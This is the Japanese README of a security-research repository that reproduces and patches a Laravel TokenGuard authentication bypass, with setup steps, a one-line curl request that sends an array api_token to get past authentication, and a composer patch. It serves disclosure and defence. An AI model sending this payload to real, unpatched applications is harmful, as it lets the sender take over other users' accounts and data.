# Laravel TokenGuard 認証バイパス (GHSA-f9x3-7vq9-cph6)

[English](README.md) · [詳細な分析](docs/analysis.ja.md)

**有効なトークンがなくても API の認証をすり抜け、他のユーザーの情報を取得できる場合があります。** Laravel の従来のトークン認証 `Illuminate\Auth\TokenGuard` に存在する問題です（[GHSA-f9x3-7vq9-cph6](https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6)）。

まず、自分のアプリの `config/auth.php` を確認してください。`'driver' => 'token'` を使うガードがあり、そのガードで API を保護していて、`hash` が `false` または省略され、Eloquent と MySQL/MariaDB を使っている構成なら、脆弱とみなしてください。

**脆弱な組み合わせを端的に言うと:**

| 条件 | 値 |
|-|-|
| `hash` | `false`（または省略） |
| `api_token` | いずれかのユーザー行に保存されている（`null` でない） |
| パッチ | 未登録 |

このリポジトリは既定でまさにこの状態です。

Laravel 5.6〜10.x では、この問題が `composer audit` や Dependabot で報告されない場合があります。報告がなくても、設定を確認してください。

このリポジトリは、Laravel `v5.6.40` と `v8.5.0` で問題を再現し、修正を確認するためのものです。

## このリポジトリを動かす

古い Laravel 8.5（PHP 7.4、MySQL）のアプリなので、Sail 標準の設定ではなく、専用の `docker-compose.yml` を用意しています。

```bash
cp .env.example .env
docker compose build
docker compose up -d
docker compose exec -u sail laravel.test composer install --prefer-dist --no-interaction
docker compose exec -u sail laravel.test php artisan key:generate
docker compose exec -u sail laravel.test php artisan migrate --seed
```

デモ用ユーザー（`demo@example.com` / `password`）と、ランダムな 9 ユーザーが作成されます。アプリは `http://localhost:8000` で起動します（8000 番が使用中なら `.env` の `APP_PORT` を変更してください）。

### バイパスは1リクエストだけ

既定ではパッチは登録されておらず、`config/auth.php` の `guards.api.hash` も既定で省略されています。古い `TokenGuard` は `hash` が無いとき `false` として扱うので、これが今回の脆弱性の対象となる構成です。さらに、Seeder がデモユーザーに固定の `api_token`（`sha256('fixed-demo-seed')`）を仕込んでいて、これは MySQL の文字列→数値変換で `0` になるよう選んだ値です。なので seed した直後、ログインもトークンもパスワードも無しで：

```bash
curl -i -X GET http://localhost:8000/api/user --json '{"api_token":[0]}'
```

これで **HTTP 200** が返り、デモユーザーの情報がそのまま取得できます。`--json`（curl 7.82 以降）は `Content-Type`/`Accept` を `application/json` にして body を送りますが、暗黙で `-X POST` にもなるため、ルートのメソッドを保つには `--json` の後に `-X GET` を置く必要があります（付けないと HTTP 405 になります）。古い curl では展開して書いてください：

```bash
curl -i -X GET http://localhost:8000/api/user \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -d '{"api_token":[0]}'
```

### ✅ 修正を適用して効果を確認する

このリポジトリは既に [`cweagans/composer-patches`](https://github.com/cweagans/composer-patches) に依存しています。これは、`extra.patches` に登録したパッチを対象パッケージのインストール時に自動適用する Composer プラグインで、`vendor/` を手で編集した場合のように `composer install` で消えることがありません。

`composer.json` の `extra.patches.laravel/framework` に [`patches/tokenguard-is-string-fix.patch`](patches/tokenguard-is-string-fix.patch) を登録します：

```diff
     "extra": {
         "laravel": {
             "dont-discover": []
-        }
+        },
+        "patches": {
+            "laravel/framework": {
+                "GHSA-f9x3-7vq9-cph6: TokenGuard array-token bypass fix": "patches/tokenguard-is-string-fix.patch"
+            }
+        }
     },
```

登録したら、フレームワークを再インストールして設定キャッシュを消去します。

```bash
docker compose exec -u sail laravel.test composer reinstall laravel/framework --prefer-dist --no-interaction
docker compose exec -u sail laravel.test php artisan config:clear
```

`composer reinstall` が「Package is not installed」と報告する場合は、先に `composer install --prefer-dist --no-interaction` を一度実行してから `reinstall` をやり直してください。`extra.patches` の登録を外した上で同じ2コマンドを再実行すれば、既定の**未修正**状態に戻せます。

### 停止

`docker compose down -v` で停止・削除します（`-v` を付けると MySQL のデータボリュームも削除されます）。

## このリポジトリについて

ローカルで再現するための Laravel 8.5 アプリケーションです（`token` ガードを標準で生成する最後のスケルトン）。ブランチは、`main` と `laravel-8.5`（8.5.0）、`laravel-5.6`（5.6.40、最初に影響を受けるバージョン）です。

> [!WARNING]
> **ローカル環境でのセキュリティ研究・学習専用です。本番環境へのデプロイやインターネットへの公開は絶対にしないでください。** 認証設定は意図的に安全でない状態です。使い捨てのデータと、自分が所有するか、テストの許可を得たシステムだけを使用してください。
>
> **既定ではパッチは登録されておらず、`guards.api.hash` も既定で省略**（`false` 扱い）**されています。** 未修正の `TokenGuard::user()` がそのまま動作し、デモユーザーのシードトークンもバイパスが毎回決定的に再現するよう選んであるため、上で説明した脆弱な挙動は最初から有効です。実際の修正パッチを登録する方法は[分析](docs/analysis.ja.md#このリポジトリでのパッチ管理)を参照してください。

## さらに詳しく

[**詳細な分析**](docs/analysis.ja.md): 根本原因、`hash` が true/false の場合の観測結果、どこまで遡るか（5.5 は影響なし、5.6 が最初）、サポートポリシーと修正の範囲、スキャナーの空白の詳細。

## 参考資料

* [GitHub Security Advisory — GHSA-f9x3-7vq9-cph6](https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6)
* [Laravel 8.5.0 の `TokenGuard.php`](https://github.com/laravel/framework/blob/v8.5.0/src/Illuminate/Auth/TokenGuard.php)
* [Laravel 8.5.0 の `EloquentUserProvider.php`](https://github.com/laravel/framework/blob/v8.5.0/src/Illuminate/Auth/EloquentUserProvider.php)
* [Laravel 11.56.1 の `TokenGuard.php`（修正済み）](https://github.com/laravel/framework/blob/v11.56.1/src/Illuminate/Auth/TokenGuard.php)
* [Laravel のサポートポリシー](https://github.com/laravel/docs/blob/13.x/releases.md#support-policy)
